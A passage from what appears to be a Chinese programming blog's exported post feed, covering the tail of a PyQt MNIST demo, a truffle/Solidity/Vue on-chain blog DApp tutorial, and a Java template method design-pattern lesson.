class="string">'好的'</span>)</span><br><span class="line">        messageBox.setStyleSheet(<span class="string">"QPushButton:hover&#123;background-color: rgb(255, 93, 52);&#125; QLabel&#123;font: 14pt \"微软雅黑\"; min-width: 900px;&#125;"</span>)</span><br><span class="line">        messageBox.exec_()</span><br><span class="line">        <span class="keyword">if</span> messageBox.clickedButton() == buttonY:</span><br><span class="line">            self.image = np.zeros((<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>), np.uint8)  <span class="comment"># 清空</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># l = LogicTrain()</span></span><br><span class="line">    <span class="comment"># l.start_tain(500, 0.5)</span></span><br><span class="line">    a = LogicApplication()</span><br><span class="line">    a.start()</span><br></pre></td></tr></table></figure>

<p>效果如图</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425144719.png" alt></p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>逻辑回归</tag>
        <tag>MNIST</tag>
      </tags>
  </entry>
  <entry>
    <title>链博--DAPP练手项目（一）</title>
    <url>/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我们都知道目前主流的网站都是属于<code>web2.0</code>的应用，例如新浪微博，明明我们才是内容的输出者，可是最终收益的大头却是这些公司，而且我们的文章放在他们的服务器，他们想怎么着就怎么着；而区块链技术的出现，让去中心化思想渐入人心，我们的数据，将由我们自己掌控！</p>
<p>链上博客，让我们的文章写入区块链，人人都是自己数据的掌控者！</p>
<p>主要功能：</p>
<ol>
<li>查看所有人写的文章</li>
<li>编写和修改自己的文章</li>
</ol>
<p>这里我们使用智能合约来实现，借助<code>truffle</code>和<code>vue</code>，实现我们的<code>DAPP</code>的开发.</p>
<a id="more"></a>

<h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p>本项目重点在于怎么使用<code>JavaScript</code>，具体而言是使用<code>web3.js</code>和智能合约交互，<strong>对于系统的性能优化尚未考虑</strong>。</p>
<p><img src="https://cdn.yalexin.top/image-20230102094246205.png" alt="image-20230102094246205.png"></p>
<hr>
<p><img src="https://cdn.yalexin.top/image-20230102094343131.png" alt="image-20230102094343131"></p>
<hr>
<p><img src="https://cdn.yalexin.top/image-20230102094601906.png" alt="image-20230102094601906"></p>
<h2 id="合约实现"><a href="#合约实现" class="headerlink" title="合约实现"></a>合约实现</h2><p>与现有流行的<code>B/C</code>模式相类似，我们需要一个类似的数据提供方，只不过<code>web2.0</code>时代下，该数据提供方是由一个中心服务器提供，在<code>web3.0</code>下，该数据由区块链提供，智能合约就有点类似数据提供方。</p>
<p>我们这里使用<code>Solidity</code>实现我们的合约.</p>
<h3 id="Node-js-安装"><a href="#Node-js-安装" class="headerlink" title="Node.js 安装"></a>Node.js 安装</h3><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">【链接】</a></p>
<h3 id="Ganache-安装"><a href="#Ganache-安装" class="headerlink" title="Ganache 安装"></a>Ganache 安装</h3><p>可以下载命令行版本的，也可以下载桌面版本的，我这里使用的是桌面版本的</p>
<p><a href="https://trufflesuite.com/ganache/" target="_blank" rel="noopener">【链接】</a></p>
<h3 id="truffle-安装"><a href="#truffle-安装" class="headerlink" title="truffle 安装"></a>truffle 安装</h3><p>使用包管理工具安装<code>truffle</code>，它是针对基于以太坊的<code>Solidity</code>语言的一套开发框架:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install -g truffle</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle --version</span></span><br><span class="line">Truffle v5.7.1 (core: 5.7.1)</span><br><span class="line">Ganache v7.6.0</span><br><span class="line">Solidity v0.5.16 (solc-js)</span><br><span class="line">Node v18.12.1</span><br><span class="line">Web3.js v1.8.1</span><br></pre></td></tr></table></figure>

<p>如果安装过程遇到网络问题，可以尝试换源或者使用<code>cnpm</code></p>
<p>然后使用<code>truffle</code>来初始化项目：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir chainBlogContracts</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> chainBlogContracts</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle init</span></span><br></pre></td></tr></table></figure>

<p>我们看一下项目结构：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tree</span></span><br><span class="line">D:.</span><br><span class="line">│  truffle-config.js</span><br><span class="line">│</span><br><span class="line">├─contracts</span><br><span class="line">├─migrations</span><br><span class="line">└─test</span><br></pre></td></tr></table></figure>

<p><code>contracts</code>存放我们的合约文件，<code>migrations</code>文件夹下存放部署脚本，<code>test</code>文件夹下存放测试脚本。</p>
<p><code>truffle-config.js</code>是配置文件，目前我们暂时修改的是<code>networks</code>对象:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">     host: "127.0.0.1",     // Localhost (default: none)</span><br><span class="line">     port: 7545,            // Standard Ethereum port (default: none)</span><br><span class="line">     network_id: "*",       // Any network (default: none)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，端口和<code>Ganache</code>中设置的一致.</p>
<h3 id="编写合约"><a href="#编写合约" class="headerlink" title="编写合约"></a>编写合约</h3><p>详细实现请参考<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">【链接】</a></p>
<p>在contracts文件夹下，新建一个<code>ChainBlog.sol</code>文件，在这里完成我们的合约逻辑。</p>
<p>我们可以将所有的文章存放到一个数组中，此外，我们使用一个结构体来表示一篇文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct Blog &#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    address author;</span><br><span class="line">    string title;</span><br><span class="line">    string summary;</span><br><span class="line">    string content;</span><br><span class="line">    uint256 createTimestamp;</span><br><span class="line">    uint256 lastUpdateTimestamp;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 记录每个人编写的文章</span><br><span class="line">Blog[] public blogList;</span><br><span class="line"></span><br><span class="line">event AddBlogEvent(uint256 id, address author, string title, string summary, string content, uint256 createTimestamp);</span><br><span class="line">event ModifyBlogEvent(uint256 id, address author, string old_title, string old_summary, string old_content, string new_title, string new_summary, string new_content, uint256 modifyTimestamp);</span><br><span class="line">event DeleteBlogEvent(uint256 id, address author, string title, string summary, string content, uint256 deleteTimestamp);</span><br></pre></td></tr></table></figure>

<p>将<code>blogList</code>设置成<code>public</code>可以方便我们从外部直接访问该数组。我们还定义了几个事件，这几个事件后文会用到；触发事件，可以理解成我们往日志系统中写入一个日志，能合约的前端<code>UI</code>，例如，<code>Apps</code>、<code>web.js</code>，或者任何与<code>Ethereum JSON-RPC API</code>连接的东西，都可以侦听这些事件。</p>
<p><strong>编写文章</strong></p>
<p>我这里设置博客的<code>ID</code>对应其在数组中的下标，因此如果想要获取某一篇文章，可以直接根据<code>ID</code>转换成索引。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function addBlog( string memory _title, string memory _summary, string memory _content ) public &#123;</span><br><span class="line">       uint256 currentId &#x3D; blogList.length;</span><br><span class="line">       blogList.push(</span><br><span class="line">           Blog(currentId, msg.sender, _title, _summary, _content, block.timestamp, block.timestamp)</span><br><span class="line">       );</span><br><span class="line">       emit AddBlogEvent(currentId, msg.sender, _title, _summary, _content, block.timestamp);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>修改文章</strong></p>
<p>修改文章时候，只有文章的所有者才能有权修改，且要判断传进来的<code>id</code>是否有效：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function modifyBlogByUserAndId(</span><br><span class="line">       uint256 id,</span><br><span class="line">       string memory _title,</span><br><span class="line">       string memory _summary,</span><br><span class="line">       string memory _content</span><br><span class="line">   ) public &#123;</span><br><span class="line">       require(id &gt;&#x3D; 0 &amp;&amp; id &lt; blogList.length, &quot;Id invalid!&quot;);</span><br><span class="line">       require(msg.sender &#x3D;&#x3D; blogList[id].author, &quot;You can only modify your blog!&quot;);</span><br><span class="line">       uint256 idx &#x3D; id;</span><br><span class="line">       string memory old_title &#x3D; blogList[idx].title;</span><br><span class="line">       string memory old_summary &#x3D; blogList[idx].summary;</span><br><span class="line">       string memory old_content &#x3D; blogList[idx].content;</span><br><span class="line">       blogList[id] &#x3D; Blog(id, msg.sender, _title, _summary, _content, blogList[id].createTimestamp, block.timestamp);</span><br><span class="line">       emit ModifyBlogEvent(id, msg.sender, old_title, old_summary, old_content, _title, _summary, _content, block.timestamp);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>删除文章</strong></p>
<p>值得注意的是，在<code>Solidity</code>中，删除数组中的元素后，会将该元素所在的位置都置为初始值，并且长度不变，在这里你可以选择将最后的元素复制到该地址，然后使用<code>pop()</code>函数将最后一个元素删除，这里我并没有选择这样子，因为我想把文章ID和其在数组中的下边对应起来同时一篇文章应该有一个固定的<code>id</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function deleteBlogByUserAndId(uint256 id) public &#123;</span><br><span class="line">    require(id &gt;&#x3D; 0 &amp;&amp; id &lt; blogList.length, &quot;Id invalid!&quot;);</span><br><span class="line">    require(</span><br><span class="line">        msg.sender &#x3D;&#x3D; blogList[id].author,</span><br><span class="line">        &quot;You can only delete your blog!&quot;</span><br><span class="line">    );</span><br><span class="line">    uint256 idx &#x3D; id;</span><br><span class="line">    string memory old_title &#x3D; blogList[idx].title;</span><br><span class="line">    string memory old_summary &#x3D; blogList[idx].summary;</span><br><span class="line">    string memory old_content &#x3D; blogList[idx].content;</span><br><span class="line">    delete blogList[idx];</span><br><span class="line">    emit DeleteBlogEvent( id, msg.sender, old_title, old_summary, old_content, block.timestamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>获取文章列表</strong></p>
<p>我们虽然在前面将<code>blogList</code>设置成了<code>public</code>，但是实际上<code>Solidity</code>编译时候会生成一个对应的<code>get</code>方法，该方法的接收一个参数作为下标，因此我们无法通过访问该变量直接获取所有的文章，我们需要暴露一个函数，使其返回所有的文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getAll() public view returns(Blog[] memory)&#123;</span><br><span class="line">       return blogList;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>view</code>关键字说明该方法会访问状态变量（<code>blogList</code>）,但是不会修改它，明确这一点很重要，它可以为调用者节省<code>gas</code>。</p>
<p>部署和连接咱们的智能合约将在之后进行。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>【1】ChainBlog（本项目完整源码）.<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">https://github.com/YaleXin/ChainBlog</a></p>
<p>【2】web3.js中文文档.<a href="https://learnblockchain.cn/docs/web3.js/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/web3.js/</a></p>
<p>【3】Solidity中文文档.<a href="https://learnblockchain.cn/docs/solidity/" target="_blank" rel="noopener">https://learnblockchain.cn/docs/solidity/</a></p>
<p>【4】truffle文档.<a href="https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html" target="_blank" rel="noopener">https://learnblockchain.cn/docs/truffle/getting-started/running-migrations.html</a></p>
<p>【5】开发、部署第一个DApp.<a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">https://learnblockchain.cn/2018/01/12/first-dapp/</a></p>
<p>【6】DApp教程：用Truffle 开发一个链上记事本.<a href="https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/" target="_blank" rel="noopener">https://learnblockchain.cn/2019/03/30/dapp_noteOnChain/</a></p>
<p>【7】Vue.js <a href="https://cn.vuejs.org/" target="_blank" rel="noopener">https://cn.vuejs.org/</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之模板方法</title>
    <url>/2020/05/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>先来看一个简单的例子：假如学院通知开学，那么每个学生所经历的流程就是：收到通知 –&gt; 购票 –&gt; 坐火车/坐飞机/坐大巴/……  –&gt; 返校报道。对应的实现代码如下：<a id="more"></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study.design.templateMethod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        StudenA A = <span class="keyword">new</span> StudenA();</span><br><span class="line">        A.process();</span><br><span class="line">        StudenB B = <span class="keyword">new</span> StudenB();</span><br><span class="line">        B.process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudenA</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        byTrain();</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">byTrain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我在火车上啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我购票啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我收到通知啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我注册完毕啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudenB</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        byPlane();</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">byPlane</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我在飞机上啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我购票啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我收到通知啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我注册完毕啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察上面的例子，发现每一个学生有相同之处，也有不同之处，如果每一个学生类都是这么写，就会产生大量冗余代码，而且假如每个学生返校后还要参加开学典礼，那么还要为每一个学生一个方法，在学生类非常多的情况下工作是非常的繁琐。因此我们可以引入<strong>模板方法</strong>。</p>
<h2 id="模板方法"><a href="#模板方法" class="headerlink" title="模板方法"></a>模板方法</h2><p> 定义：定义一个操作中的算法骨架，而将算法的一些步骤延迟到子类中，使得子类可以不改变该算法结构的情况下重定义该算法的某些特定步骤。它是一种类行为型模式。</p>
<h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><ul>
<li><p>算法的整体步骤大体上固定，也存在不同之处，可以将不同的逻辑业务抽象出来，子类进行实现。例如上文中的“收到通知”、“购票”、“返校报道”</p>
</li>
<li><p>子类有公共的行为，可以提出到父类中，避免代码重复。</p>
</li>
<li><p>需要通过子类判断父类中某个步骤是否执行，从而实现子类对父类的反向控制。</p>
</li>
</ul>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="定义抽象模板类"><a href="#定义抽象模板类" class="headerlink" title="定义抽象模板类"></a>定义抽象模板类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        backSchool();</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我购票啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我收到通知啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我注册完毕啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="定义实现类"><a href="#定义实现类" class="headerlink" title="定义实现类"></a>定义实现类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentA</span> <span class="keyword">extends</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"===我通过坐飞机返校的==="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentB</span> <span class="keyword">extends</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"===我通过坐火车返校的==="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BaseProcess A = <span class="keyword">new</span> StudentA();</span><br><span class="line">        A.process();</span><br><span class="line">        BaseProcess B = <span class="keyword">new</span> StudentB();</span><br><span class="line">        B.process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="模式扩展"><a href="#模式扩展" class="headerlink" title="模式扩展"></a>模式扩展</h2><p> 在模板方法模式中，基本方法包含：抽象方法、具体方法和钩子方法，正确使用“钩子方法”可以使得子类控制父类的行为。 例如上文中，不同学生返校的时候可能还有具体不同的行为，例如单身的学生是直接进入校门然后回到宿舍的，但是有男/女朋友的学生可能进入校门后第一件事就是去见另一半。要实现该逻辑只需要在抽象父类中定义抽象钩子方法，子类实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        receiveNotification();</span><br><span class="line">        buyTicket();</span><br><span class="line">        backSchool();</span><br><span class="line">        <span class="keyword">if</span> (!isSingle()) &#123;</span><br><span class="line">            SeeCouples();</span><br><span class="line">        &#125;</span><br><span class="line">        register();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">boolean</span> <span class="title">isSingle</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buyTicket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我购票啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">receiveNotification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我收到通知啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SeeCouples</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"好久不见，我快要想死你了~~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====我注册完毕啦===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentB</span> <span class="keyword">extends</span> <span class="title">BaseProcess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backSchool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"===我通过坐火车返校的==="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isSingle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="主要缺点"><a href="#主要缺点" class="headerlink" title="主要缺点"></a>主要缺点</h2><ul>
<li>需要为每一个基本方法的不同实现提供一个子类 ，假如父类中可变的基本方法很多，那么势必造成实现的子类非常多，后期维护难度增大。</li>
<li>父类中的抽象方法由子类实现，子类执行的结果会影响父类的结果 ，不仅增加了阅读难度，也 违反了<a href="https://www.cnblogs.com/jimoer/p/9163426.html#autoid-3-2-0" target="_blank" rel="noopener">里氏替换原则</a>，会给程序带来风险。 </li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>模板方法</tag>
      </tags>
  </entry>
  <entry>
    <title>链博--DAPP练手项目（三）</title>
    <url>/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<p>原文再续，书接上回。</p>
<p>这一回我们主要完成Vue项目和智能合约交互。完整代码请参考<a href="https://github.com/YaleXin/ChainBlog" target="_blank" rel="noopener">【链接】</a><a id="more"></a></p>
<h2 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h2><p>在首页主要是请求全部的文章：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Web3 <span class="keyword">from</span> <span class="string">"web3"</span>;</span><br><span class="line"><span class="keyword">import</span> ChainBlogJson <span class="keyword">from</span> <span class="string">"@/build/ChainBlog.json"</span>;</span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line">methods: &#123;</span><br><span class="line">    <span class="comment">// 读取 json 文件，利用 abi 和地址初始化合约</span></span><br><span class="line">    <span class="keyword">async</span> f() &#123;</span><br><span class="line">      <span class="comment">//   var web3 = new Web3(Web3.givenProvider || "ws://localhost:8545");</span></span><br><span class="line">      <span class="keyword">var</span> web3 = <span class="keyword">new</span> Web3(<span class="string">"ws://localhost:7545"</span>);</span><br><span class="line">      <span class="keyword">const</span> networkId = <span class="keyword">await</span> web3.eth.net.getId();</span><br><span class="line">      <span class="keyword">const</span> abi = ChainBlogJson.abi;</span><br><span class="line">      <span class="keyword">const</span> contractAddress = ChainBlogJson.networks[networkId].address;</span><br><span class="line">      <span class="keyword">const</span> contract = <span class="keyword">new</span> web3.eth.Contract(abi, contractAddress);</span><br><span class="line">      <span class="keyword">this</span>.contract = contract;</span><br><span class="line">      <span class="keyword">this</span>.getAllBlog();</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 调用合约中的函数</span></span><br><span class="line">    <span class="keyword">async</span> getAllBlog() &#123;</span><br><span class="line">      <span class="keyword">this</span>.contract.methods</span><br><span class="line">        .getAll()</span><br><span class="line">        .call()</span><br><span class="line">        .then(<span class="function">(<span class="params">blogs</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">this</span>.blogs = blogs;</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(e);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    <span class="keyword">this</span>.f();</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="新增文章页面"><a href="#新增文章页面" class="headerlink" title="新增文章页面"></a>新增文章页面</h2><p>在这个页面中，我们要获取<code>MetaMask</code>中活跃的账户，即正在使用的账户，然后连接智能合约，调用智能合约，流程还是差不多：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">submit() &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.content == <span class="string">""</span> || <span class="keyword">this</span>.title == <span class="string">""</span>)</span><br><span class="line">    alert(<span class="string">"Content and title can't be empty!"</span>);</span><br><span class="line">  <span class="comment">// 获取 metamask 中启动的账号</span></span><br><span class="line">  <span class="built_in">window</span>.ethereum</span><br><span class="line">    .enable()</span><br><span class="line">    .then(<span class="function">(<span class="params">accounts</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.contract.methods</span><br><span class="line">        .addBlog(<span class="keyword">this</span>.title, <span class="keyword">this</span>.summary, <span class="keyword">this</span>.content)</span><br><span class="line">        .send(&#123;</span><br><span class="line">          <span class="comment">// 利用授权的第一个，即正在活跃的账号进行提交文章</span></span><br><span class="line">          <span class="keyword">from</span>: accounts[<span class="number">0</span>],</span><br><span class="line">          gas: <span class="number">3000000</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">          alert(<span class="string">"发表成功"</span>);</span><br><span class="line">          <span class="keyword">this</span>.$router.push(&#123; <span class="attr">name</span>: <span class="string">"home"</span> &#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(e);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span 